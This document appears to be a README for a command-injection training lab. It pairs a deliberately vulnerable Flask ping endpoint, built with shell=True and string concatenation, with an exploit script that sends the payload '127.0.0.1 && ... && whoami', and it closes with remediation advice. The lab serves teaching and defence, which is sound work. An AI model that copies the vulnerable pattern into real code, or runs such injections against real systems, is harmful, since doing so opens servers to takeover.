# OS Command Injection & Remote Code Execution (Module 16)

## 🎯 Executive Summary
This laboratory demonstrates **OS Command Injection (RCE)** through improper input neutralization **(CWE-78)**. It highlights the critical danger of passing unsanitized user input directly to system shells. By chaining commands, an attacker can pivot from a restricted web application interface to full, underlying Operating System compromise.



---

## 🏗️ Technical Architecture

### 1. The Vulnerable Asset (`vulnerable_ping.py`)
The server simulates an administrative Network Diagnostic Portal (a "Ping" utility). The critical architectural flaw lies in the use of string concatenation to build the OS command, combined with executing it via Python's `subprocess` with `shell=True`.

```python
from flask import Flask, request
import subprocess
import platform

app = Flask(__name__)

@app.route('/ping')
def ping():
    target = request.args.get('target', '127.0.0.1')
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    
    # FATAL VULNERABILITY: Raw string formatting passed to the OS shell
    command = f"ping {param} 1 {target}"
    
    try:
        # shell=True allows execution of chained operators (&&, ;, |)
        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        return f"<pre>{output}</pre>"
    except subprocess.CalledProcessError as e:
        return f"<pre>{e.output}</pre>"

if __name__ == '__main__':
    app.run(port=5055)
```
###  2. The Exploit Engine (rce_exploit.py)
This script automates the command injection attack. It satisfies the expected input (127.0.0.1) but utilizes the && logical operator to instruct the OS shell to immediately execute subsequent, unauthorized commands (e.g., whoami)

```python
import requests

TARGET = "[http://127.0.0.1:5055/ping](http://127.0.0.1:5055/ping)"
PAYLOAD = "127.0.0.1 && echo [!!!] SYSTEM_COMPROMISED [!!!] && whoami"

def run_exploit():
    print(f"[*] Injecting RCE payload: {PAYLOAD}")
    response = requests.get(TARGET, params={'target': PAYLOAD})
    
    if "SYSTEM_COMPROMISED" in response.text:
        print("\n[+] CRITICAL: Remote Code Execution (RCE) Achieved!")
        # Parse and display the raw terminal output
        output = response.text.split('<pre>')[1].split('</pre>')[0].strip()
        print(f"\n{output}")
    else:
        print("\n[-] Attack failed. Target may be sanitized.")

if __name__ == "__main__":
    run_exploit()
```
### 🛠️ Detailed Execution Guide
Phase 1: Environment Hardening
To prevent library conflicts, deploy within an isolated Python Virtual Environment:
```bash
# 1. Clone the repository
git clone [https://github.com/this-is-the-invincible-meghnad/Command-Injection-Lab.git](https://github.com/this-is-the-invincible-meghnad/Command-Injection-Lab.git)

# 2. Enter the project directory
cd Command-Injection-Lab

# 3. Create and activate a clean virtual environment
python -m venv venv
.\venv\Scripts\activate  # Windows
# source venv/bin/activate # Mac/Linux

# 4. Install the required security testing libraries
pip install flask requests

# 5. Start the Vulnerable Server (Terminal A)
python vulnerable_ping.py

# 6. Execute the Exploit (Terminal B)
python rce_exploit.py
```
###  Phase 2: Expected Output
Upon successful injection, the exploit will return the ping statistics followed immediately by the attacker's custom echo statement and the exact user privileges of the server application (e.g., desktop-vuigd9k\pinank), confirming full RCE.

### 🛡️ Remediation & Architectural Defense
To achieve a production-grade, secure architecture and eliminate Command Injection vectors, implement the following controls:

1. Avoid the Shell: Never use shell=True in Python's subprocess module.

2. Parameterize Commands: Pass commands as arrays rather than concatenated strings. The OS will treat the entire array element as the target, neutralizing shell operators.

 # Secure implementation: subprocess.run(['ping', '-c', '1', target])

3. Strict Input Validation: Use Regular Expressions (Regex) to ensure the target parameter strictly matches the format of a valid IPv4 or IPv6 address before passing it to any internal function.